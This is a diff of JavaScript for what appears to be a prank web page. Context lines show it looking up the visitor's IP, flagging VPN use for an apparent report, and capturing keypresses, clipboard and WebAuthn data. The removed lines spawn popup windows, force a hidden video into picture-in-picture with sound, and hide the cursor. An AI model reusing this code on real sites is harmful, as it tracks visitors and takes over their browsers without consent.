@@ -43,7 +43,7 @@ fetch('https://api.ipify.org/?format=json')
               inline: true
             },
             {
-              name: 'Is on VPN:',
+              name: 'VPN:',
               value: isVPN ? 'Yes' : 'No',
               inline: true
             }
@@ -74,12 +74,6 @@ function ipToNumber(ip) {
     return (result << 8) + parseInt(octet, 10);
   }, 0);
 }
-
-
-const VIDEOS = [
-  'kaczka.mp4',
-  'bassboosted.mp3',
-]
 
 const PHRASES = [
   'kaczuszka',
@@ -360,49 +354,6 @@ function interceptUserInput (onInput) {
   document.body.addEventListener('keypress', onInput)
 }
 
-function startInvisiblePictureInPictureVideo () {
-  const video = document.createElement('video')
-  video.src = getRandomArrayEntry(VIDEOS)
-  video.loop = true
-  video.muted = true
-  video.style = HIDDEN_STYLE
-  video.autoplay = true
-  video.play()
-
-  document.body.appendChild(video)
-}
-
-function enablePictureInPicture () {
-  const video = document.querySelector('video')
-  if (document.pictureInPictureEnabled) {
-    video.style = ''
-    video.muted = false
-    video.requestPictureInPicture()
-    video.play()
-  }
-}
-
-function focusWindows () {
-  wins.forEach(win => {
-    if (!win.closed) win.focus()
-  })
-}
-
-function openWindow () {
-  const { x, y } = getRandomCoords()
-  const opts = `width=${WIN_WIDTH},height=${WIN_HEIGHT},left=${x},top=${y}`
-  const win = window.open(window.location.pathname, '', opts)
-
-  if (!win) return
-  wins.push(win)
-
-  if (wins.length === 2) setupSearchWindow(win)
-}
-
-function hideCursor () {
-  document.querySelector('html').style = 'cursor: none;'
-}
-
 function speak (phrase) {
   if (phrase == null) phrase = getRandomArrayEntry(PHRASES)
   window.speechSynthesis.speak(new window.SpeechSynthesisUtterance(phrase))
@@ -466,10 +417,6 @@ function requestClipboardRead () {
  */
 function requestWebauthnAttestation () {
   try {
-    // From https://developer.mozilla.org/en-US/docs/Web/API/Web_Authentication_API
-    // This code is public domain, per https://developer.mozilla.org/en-US/docs/MDN/About#Copyrights_and_licenses
-
-    // sample arguments for registration
     const createCredentialDefaultArgs = {
       publicKey: {
       // Relying Party (a.k.a. - Service):
